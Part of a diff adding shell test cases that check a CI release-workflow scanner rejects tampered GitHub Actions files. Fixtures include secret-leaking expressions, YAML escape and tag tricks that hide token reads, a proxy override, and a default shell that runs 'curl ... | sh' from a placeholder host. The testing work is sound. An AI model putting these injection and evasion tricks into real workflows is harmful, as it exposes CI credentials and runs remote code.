+expect_rejection "a snapshot input carrying a dropped declared input" snapshot_input_dropped
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a dropped declared input" \
+  || fail "a snapshot input carrying a dropped declared input was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_release_mode_rejection release-artifact \
+  "a build step heredoc line that starts with # and carries a token expression" \
+  build_heredoc_hash_line_token \
+  'build job references a secrets context or GitHub token context (#1712)'
+expect_release_mode_rejection release-artifact \
+  "a build job env value filtering every property of the github context" \
+  build_env_object_wildcard \
+  'build job references a secrets context or GitHub token context (#1712)'
+expect_rejection "a snapshot job with a field the generator did not write" snapshot_extra_field
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a field the generator did not write" \
+  || fail "a snapshot job with an extra field was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_release_mode_rejection release-artifact \
+  "a build run body with a #-leading line the generator did not write" \
+  build_run_body_hash_line \
+  'build job is not the generated release-artifact build job (#975)'
+expect_release_mode_rejection release-artifact \
+  "a build job env value spelling an expression through a YAML escape" \
+  build_env_escaped_expression \
+  'build job is not the generated release-artifact build job (#975)'
+expect_release_mode_rejection release-artifact \
+  "a build job with an action step the generator did not write" \
+  build_extra_action_step \
+  'build job is not the generated release-artifact build job (#975)'
+expect_release_mode_rejection release-artifact \
+  "a build matrix entry with a key the generator did not write" \
+  build_matrix_extra_key \
+  'build job is not the generated release-artifact build job (#975)'
+commented_build_adopter="$tmproot/adopter-artifact-commented-build"
+build_adopter "$commented_build_adopter" yes workflow release-artifact
+sed -i 's|^    timeout-minutes: 45$|    # Raised only by regenerating with a reviewed generator change.\n    timeout-minutes: 45|' \
+  "$commented_build_adopter/.github/workflows/release.yml"
+git -C "$commented_build_adopter" commit -aqm 'comment the generated build job'
+schedule_adopter_script "$commented_build_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  pass "emitted suite accepts a YAML comment beside the generated build job wiring"
+else
+  fail "emitted suite rejected a YAML comment beside the generated build job wiring: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+# A comment after a block scalar header is a comment like any other: the scan
+# blanks it rather than reading its text as an expression.
+header_comment_adopter="$tmproot/adopter-block-header-comment"
+build_adopter "$header_comment_adopter" yes workflow
+python3 - "$header_comment_adopter/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+at = lines.index("        run: |\n", start)
+lines[at] = "        run: | # never ${{ secrets.NPM_TOKEN }}\n"
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+git -C "$header_comment_adopter" commit -aqm 'comment a generated block scalar header'
+schedule_adopter_script "$header_comment_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  pass "emitted suite blanks a comment after a block scalar header"
+else
+  fail "emitted suite read a comment after a block scalar header: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+expect_rejection "a verify step env value spelling an expression through a YAML escape" \
+  verify_escaped_expression
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a YAML escape it cannot read" \
+  || fail "a YAML escape in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value hiding an escape in a quoted scalar behind a block header" \
+  verify_quoted_scalar_behind_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a quoted scalar left open across lines" \
+  || fail "a multi-line quoted scalar in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with a !!str-tagged quoted scalar left open across lines" verify_tagged_quoted_scalar_behind_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a !!str-tagged quoted scalar left open across lines" \
+  || fail "a !!str-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with a !-tagged quoted scalar left open across lines" verify_nonspecific_tagged_quoted_scalar_behind_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a !-tagged quoted scalar left open across lines" \
+  || fail "a !-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with a verbatim-tagged quoted scalar left open across lines" verify_verbatim_tagged_quoted_scalar_behind_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a verbatim-tagged quoted scalar left open across lines" \
+  || fail "a verbatim-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with an anchored quoted scalar left open across lines" verify_anchored_quoted_scalar_behind_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses an anchored quoted scalar left open across lines" \
+  || fail "an anchored quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with full-line comments carrying an expression string across a value" verify_comment_carried_expression
+sync_last_rejection
+grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+  && pass "the verify-job context scan sees the value between full-line comments" \
+  || fail "the verify-job context scan missed the value between full-line comments: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with trailing comments carrying an expression string across a value" verify_trailing_comment_carried_expression
+sync_last_rejection
+grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+  && pass "the verify-job context scan sees the value between trailing comments" \
+  || fail "the verify-job context scan missed the value between trailing comments: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with a value leaving an expression string open across the next value" verify_value_carried_expression
+sync_last_rejection
+grep -qF 'an expression left open at the end of its scalar' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a value leaving an expression string open across the next value" \
+  || fail "a value leaving an expression string open across the next value in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with an expression opened in a mapping key" verify_expression_in_mapping_key
+sync_last_rejection
+grep -qF 'an expression in a mapping key' "$tmproot/run.out" \
+  && pass "the release-shape check refuses an expression opened in a mapping key" \
+  || fail "an expression opened in a mapping key in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with an expression inside a flow collection" verify_expression_in_flow_collection
+sync_last_rejection
+grep -qF 'an expression inside a flow collection' "$tmproot/run.out" \
+  && pass "the release-shape check refuses an expression inside a flow collection" \
+  || fail "an expression inside a flow collection in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a workflow-scope value after a comment carrying an expression string" \
+  workflow_scope_comment_carried_expression
+sync_last_rejection
+grep -qF 'exposes a GitHub token at workflow scope (#1712)' "$tmproot/run.out" \
+  && pass "the workflow-scope scan reads past a comment carrying an expression string" \
+  || fail "a workflow-scope token read after an expression-carrying comment was not refused by the scan: $(tail -2 "$tmproot/run.out")"
+expect_release_mode_rejection release-artifact \
+  "a build job env value between comments carrying an expression string" \
+  build_comment_carried_expression \
+  'build job references a secrets context'
+expect_rejection "a snapshot input between comments carrying an expression string" \
+  snapshot_comment_carried_expression
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects an input between comments carrying an expression string" \
+  || fail "a snapshot input between expression-carrying comments was not rejected by the pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step whose dash-led quoted key opens an empty block scalar" \
+  verify_dash_quoted_key_block_header
+sync_last_rejection
+grep -qF 'the release-shape check cannot read: a backslash' "$tmproot/run.out" \
+  && pass "the scanner reads the keys after a dash-led quoted block scalar key as structure" \
+  || fail "an escape after a dash-led quoted block scalar key in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step value whose block scalar header sits alone on its line" \
+  verify_block_header_on_own_line
+sync_last_rejection
+grep -qF 'a block scalar header with no key or sequence entry on its line' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a block scalar header alone on its line" \
+  || fail "a block scalar header alone on its line in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step block scalar leaving an expression string open over closing braces" \
+  verify_open_string_ending_in_braces
+sync_last_rejection
+grep -qF 'an expression left open at the end of its scalar' "$tmproot/run.out" \
+  && pass "the release-shape check refuses an expression string left open over closing braces" \
+  || fail "an expression string left open over closing braces in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+# shellcheck disable=SC2016 # each entry is literal YAML for the fixture, never expanded
+{
+  expect_rejection 'a top-level "env" key before jobs reading a secret' \
+    add_top_level_entry before-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key before jobs' \
+    || fail "a top-level \"env\" key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level "env" key after jobs reading a secret' \
+    add_top_level_entry after-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key after jobs' \
+    || fail "a top-level \"env\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection "a top-level 'env' key before jobs reading a secret" \
+    add_top_level_entry before-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass "the release-shape check refuses a top-level 'env' key before jobs" \
+    || fail "a top-level 'env' key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection "a top-level 'env' key after jobs reading a secret" \
+    add_top_level_entry after-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass "the release-shape check refuses a top-level 'env' key after jobs" \
+    || fail "a top-level 'env' key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level spaced env key before jobs reading a secret' \
+    add_top_level_entry before-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level spaced env key before jobs' \
+    || fail "a top-level spaced env key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level spaced env key after jobs reading a secret' \
+    add_top_level_entry after-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level spaced env key after jobs' \
+    || fail "a top-level spaced env key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level "defaults" key after jobs overriding the run shell' \
+    add_top_level_entry after-jobs '"defaults":' '  run:' '    shell: bash -c "curl -sf https://example.invalid | sh; {0}"'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "defaults" key after jobs' \
+    || fail "a top-level \"defaults\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  # No context read and no variable on the credential-sensitive list: only the
+  # key set sees a workflow environment that routes the credentialed
+  # acquisition's registry traffic through a caller-chosen proxy.
+  expect_rejection 'a top-level "env" key after jobs setting a proxy' \
+    add_top_level_entry after-jobs '"env":' '  HTTPS_PROXY: http://proxy.example.invalid:8080'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key setting a proxy' \
+    || fail "a top-level \"env\" key setting a proxy after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a generated run-name moved after jobs reading the token' move_run_name_after_jobs
+  sync_last_rejection
+  grep -qF 'exposes a GitHub token at workflow scope (#1712)' "$tmproot/run.out" \
+    && pass 'the workflow-scope scan reads a generated key moved after jobs' \
+    || fail "a token read in a run-name moved after jobs was not refused by the workflow-scope scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step bare if reading the token' verify_step_if \
+    "        if: steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a bare if as an expression' \
+    || fail "a token read in a bare verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step wrapped if reading the token' verify_step_if \
+    "        if: \${{ steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x') }}"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a wrapped if' \
+    || fail "a token read in a wrapped verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step double-quoted if reading the token' verify_step_if \
+    "        if: \"steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')\""
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a double-quoted if as an expression' \
+    || fail "a token read in a double-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  # A single-quoted YAML value read as expression text would be one string
+  # literal, so its delimiters are stripped before the scan.
+  expect_rejection 'a verify step single-quoted if reading the token' verify_step_if \
+    "        if: 'success() || contains(github.TOKEN, github.sha)'"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a single-quoted if as an expression' \
+    || fail "a token read in a single-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  # A tab after the colon separates the value as a space does.
+  expect_rejection 'a verify step if separated by a tab reading the token' verify_step_if \
+    "        if:"$'\t'"steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads an if separated by a tab' \
+    || fail "a token read in a tab-separated verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  # Fail closed on key case: any case variant of `if` is read as expression code.
+  expect_rejection 'a verify step uppercase IF reading the token' verify_step_if \
+    "        IF: steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads an uppercase IF as an expression' \
+    || fail "a token read in an uppercase verify step IF was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step if continued onto the next line reading the token' verify_step_if \
+    "        if: steps.release-version.outputs.selected == 'true' ||" \
+    "          contains(github.TOKEN, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads an if continued onto the next line' \
+    || fail "a token read on a continued verify step if line was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a publish prefix input with a secret appended' publish_with_input \
+    '      prefix: ${{ inputs.prefix }}' \
+    '      prefix: ${{ inputs.prefix }}${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
+    && pass 'the publish job pin refuses a secret appended to a generated input' \
+    || fail "a secret appended to the publish prefix input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a publish version input with the token appended' publish_with_input \
+    '      version: ${{ needs.verify.outputs.version }}' \
+    '      version: ${{ needs.verify.outputs.version }}${{ github.token }}'
+  sync_last_rejection
+  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
+    && pass 'the publish job pin refuses the token appended to a generated input' \
+    || fail "the token appended to the publish version input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
+}
+publish_snapshot_version_token() {
+  publish_with_input "$1" \
+    '          VERSION: ${{ needs.verify.outputs.version }}' \
+    '          VERSION: ${{ needs.verify.outputs.version }}${{ github.token }}'
+}
+expect_release_mode_rejection release-snapshot \
+  "a release-snapshot publish env value with the token appended" \
+  publish_snapshot_version_token \
+  'publish job is not the generated publish job (ADR 0099)'
+expect_release_mode_rejection release-artifact \
+  "a release-artifact publish env value with the token appended" \
+  publish_snapshot_version_token \
+  'publish job is not the generated publish job (ADR 0099)'
+expect_rejection "a verify step env value with a doubled quote that moves where an expression ends" verify_escaped_single_quote_expression
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a doubled quote that moves where an expression ends" \
+  || fail "a doubled quote that moves where an expression ends in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify step env value with a line separator that splitlines() and YAML read differently" verify_line_separator_in_comment
+sync_last_rejection
+grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
+  && pass "the release-shape check refuses a line separator that splitlines() and YAML read differently" \
+  || fail "a line separator that splitlines() and YAML read differently in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a release caller with an extra job selecting the release environment" add_release_environment_job
+sync_last_rejection
+grep -qF 'declares jobs other than the generated' "$tmproot/run.out" \
+  && pass "the release caller job set refuses an extra job selecting the release environment" \
+  || fail "a release caller with an extra job selecting the release environment was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a release caller with an extra job reading a secret" add_secret_reading_job
+sync_last_rejection
+grep -qF 'declares jobs other than the generated' "$tmproot/run.out" \
+  && pass "the release caller job set refuses an extra job reading a secret" \
+  || fail "a release caller with an extra job reading a secret was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a release caller with a duplicate snapshot job key" duplicate_snapshot_job
+sync_last_rejection
+grep -qF 'declares a duplicate job or top-level key' "$tmproot/run.out" \
+  && pass "the release caller job set refuses a duplicate snapshot job key" \
+  || fail "a release caller with a duplicate snapshot job key was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
+expect_release_mode_rejection release-artifact \
+  "a publish job that selects the release environment" \
+  publish_environment \
+  'declares a job environment or an unreadable job mapping'
+expect_release_mode_rejection release-artifact \
+  "a build matrix entry with a dependency index the generator did not write" \
+  build_matrix_dependency_index_changed \
+  'build job is not the generated release-artifact build job (#975)'
 
 expect_rejection "a snapshot caller granting GITHUB_TOKEN contents-write (#784)" grant_snapshot_github_token_write
 expect_rejection "a snapshot job that verifies nothing first (#463, #464)" drop_snapshot_needs
